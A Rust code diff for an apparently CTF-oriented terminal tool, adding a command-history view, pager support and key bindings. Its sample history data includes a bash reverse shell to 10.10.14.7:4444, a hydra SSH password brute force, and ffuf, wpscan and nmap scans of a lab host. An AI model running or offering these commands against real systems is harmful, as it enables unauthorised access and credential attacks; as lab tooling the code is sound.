@@ -4,6 +4,7 @@ mod clipboard;
 mod discord;
 mod gtfobins;
 mod hashid;
+mod history;
 mod htb;
 mod loot;
 mod model;
@@ -204,6 +205,29 @@ fn snapshot(what: &str, theme: Option<&str>) {
         }
         "help" => app.mode = Mode::Help,
         "themes" => app.open_theme_picker(),
+        "history" => {
+            use history::{Action, Entry};
+            let e = |mins: i64, action, key: &str, name: &str, cmd: &str, exit, log: Option<&str>| Entry {
+                ts: 1_795_600_000 - mins * 60,
+                time: format!("2026-11-25 {:02}:{:02}:00", 14 - mins / 60, 59 - mins % 60),
+                action,
+                key: key.into(),
+                name: name.into(),
+                cmd: cmd.into(),
+                run: String::new(),
+                exit,
+                log: log.map(std::path::PathBuf::from),
+            };
+            app.history = vec![
+                e(2, Action::Run, "crack/hydra ssh", "hydra ssh", "hydra -l svc-web -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.42 -t 4", Some(0), Some("/home/you/rooms/lame/logs/20261125-145712-hydra-ssh.log")),
+                e(6, Action::Copy, "shells/bash tcp", "bash tcp", "bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'", None, None),
+                e(9, Action::Run, "web/ffuf dirs", "ffuf dirs", "ffuf -u http://10.10.11.42/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt", Some(-1), Some("/home/you/rooms/lame/logs/20261125-145012-ffuf-dirs.log")),
+                e(14, Action::Run, "web/wpscan enumerate", "wpscan enumerate", "wpscan --url http://10.10.11.42 -e vp,vt,u", Some(127), None),
+                e(31, Action::Run, "nmap/Quick top-ports", "Quick top-ports", "nmap -sC -sV --open -T4 10.10.11.42 -oN nmap/quick.txt", Some(0), Some("/home/you/rooms/lame/logs/20261125-142801-quick-top-ports.log")),
+                e(33, Action::Copy, "misc/add /etc/hosts", "add /etc/hosts", "echo '10.10.11.42 lame.htb' | sudo tee -a /etc/hosts", None, None),
+            ];
+            app.mode = Mode::History;
+        }
         "restored" => {
             // dead tabs as they come back from a saved session
             app.mode = Mode::Normal;
@@ -304,21 +328,36 @@ fn snapshot(what: &str, theme: Option<&str>) {
     }
 }
 
-/// Suspend the TUI, run $EDITOR on a file, then restore the TUI.
-/// `mouse_on`: mouse capture is currently enabled (turned off for the editor,
-/// or its escape sequences land in the file, then back on).
-fn edit_in_external(
+/// `$PAGER`, else `less -R` (job logs keep their colours), else `$EDITOR`.
+fn pager() -> String {
+    if let Some(p) = std::env::var("PAGER").ok().filter(|p| !p.trim().is_empty()) {
+        return p;
+    }
+    if tools::ToolIndex::scan().has("less") {
+        return "less -R".into();
+    }
+    std::env::var("EDITOR").unwrap_or_else(|_| "nano".into())
+}
+
+/// Suspend the TUI, run `program` (an editor or pager, args allowed, e.g.
+/// "less -R") on a file, then restore the TUI. `mouse_on`: mouse capture is
+/// currently enabled (turned off meanwhile, or its escape sequences land in
+/// the program, then back on).
+fn run_external(
     terminal: &mut Terminal<CrosstermBackend<Stdout>>,
+    program: &str,
     path: &std::path::Path,
     mouse_on: bool,
 ) -> io::Result<()> {
-    let editor = std::env::var("EDITOR").unwrap_or_else(|_| "nano".into());
+    let mut words = program.split_whitespace();
+    let bin = words.next().unwrap_or("nano").to_string();
+    let args: Vec<String> = words.map(str::to_string).collect();
     disable_raw_mode()?;
     if mouse_on {
         execute!(terminal.backend_mut(), DisableMouseCapture)?;
     }
     execute!(terminal.backend_mut(), DisableBracketedPaste, LeaveAlternateScreen)?;
-    let status = std::process::Command::new(&editor).arg(path).status();
+    let status = std::process::Command::new(&bin).args(&args).arg(path).status();
     enable_raw_mode()?;
     execute!(terminal.backend_mut(), EnterAlternateScreen, EnableBracketedPaste)?;
     if mouse_on {
@@ -428,7 +467,12 @@ fn run(terminal: &mut Terminal<CrosstermBackend<Stdout>>, app: &mut App) -> io::
             }
         }
         if let Some(path) = app.pending_editor.take() {
-            edit_in_external(terminal, &path, mouse_on)?;
+            let editor = std::env::var("EDITOR").unwrap_or_else(|_| "nano".into());
+            run_external(terminal, &editor, &path, mouse_on)?;
+            last_tick = Instant::now();
+        }
+        if let Some(path) = app.pending_pager.take() {
+            run_external(terminal, &pager(), &path, mouse_on)?;
             last_tick = Instant::now();
         }
         if last_tick.elapsed() >= tick_rate {
@@ -491,6 +535,7 @@ fn handle_key(app: &mut App, key: KeyEvent) {
             KeyCode::Esc | KeyCode::Char('q') | KeyCode::Char('T') => app.theme_pick_cancel(),
             _ => {}
         },
+        Mode::History => history_keys(app, key),
         Mode::Export => match key.code {
             KeyCode::Char('y') | KeyCode::Char('Y') => app.export_writeup(true),
             KeyCode::Char('n') | KeyCode::Char('N') | KeyCode::Enter => app.export_writeup(false),
@@ -542,6 +587,7 @@ fn handle_paste(app: &mut App, text: &str) {
         Mode::Note => app.note_buf.push_str(&line),
         Mode::Flag => app.flag_buf.push_str(&line),
         Mode::Gtfo => line.chars().for_each(|c| app.gtfo_push(c)),
+        Mode::History => line.chars().for_each(|c| app.history_push(c)),
         Mode::Htb => {
             if let Some(b) = app.htb_input_buf() {
                 b.push_str(&line);
@@ -591,6 +637,37 @@ fn pty_paste_bytes(text: &str, bracketed: bool) -> Vec<u8> {
         out.extend_from_slice(b"\x1b[201~");
     }
     out
+}
+
+fn history_keys(app: &mut App, key: KeyEvent) {
+    // `/` filter: typing goes into the query until ⏎ / esc
+    if app.history_typing {
+        match key.code {
+            KeyCode::Esc | KeyCode::Enter => app.history_typing = false,
+            KeyCode::Down => app.history_next(),
+            KeyCode::Up => app.history_prev(),
+            KeyCode::Backspace => app.history_pop(),
+            KeyCode::Char(c) if !key.modifiers.contains(KeyModifiers::CONTROL) => app.history_push(c),
+            _ => {}
+        }
+        return;
+    }
+    match key.code {
+        KeyCode::Esc if !app.history_query.is_empty() => {
+            app.history_query.clear();
+            app.history_idx = 0;
+        }
+        KeyCode::Esc | KeyCode::Char('q') => app.mode = Mode::Normal,
+        KeyCode::Char('r') if key.modifiers.contains(KeyModifiers::CONTROL) => app.mode = Mode::Normal,
+        KeyCode::Down | KeyCode::Char('j') => app.history_next(),
+        KeyCode::Up | KeyCode::Char('k') => app.history_prev(),
+        KeyCode::Char('/') => app.history_typing = true,
+        KeyCode::Backspace => app.history_pop(),
+        KeyCode::Enter => app.history_copy(),
+        KeyCode::Char('x') => app.history_rerun(),
+        KeyCode::Char('l') => app.history_open_log(),
+        _ => {}
+    }
 }
 
 fn gtfo_keys(app: &mut App, key: KeyEvent) {
@@ -784,6 +861,11 @@ fn normal_keys(app: &mut App, key: KeyEvent) {
         }
         return;
     }
+    // ^r: history (before the run pane, where plain r re-runs)
+    if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('r') {
+        app.open_history();
+        return;
+    }
     // run pane has focus: its keys take priority
     if app.focus == Focus::Run && run_focus_keys(app, key) {
         return;
@@ -838,6 +920,7 @@ fn normal_keys(app: &mut App, key: KeyEvent) {
         KeyCode::Char('F') => app.flag_open(),
         KeyCode::Char('E') => app.export_open(),
         KeyCode::Char('m') => app.toggle_hide_missing(),
+        KeyCode::Char('y') => app.open_history(),
         _ => {}
     }
 }
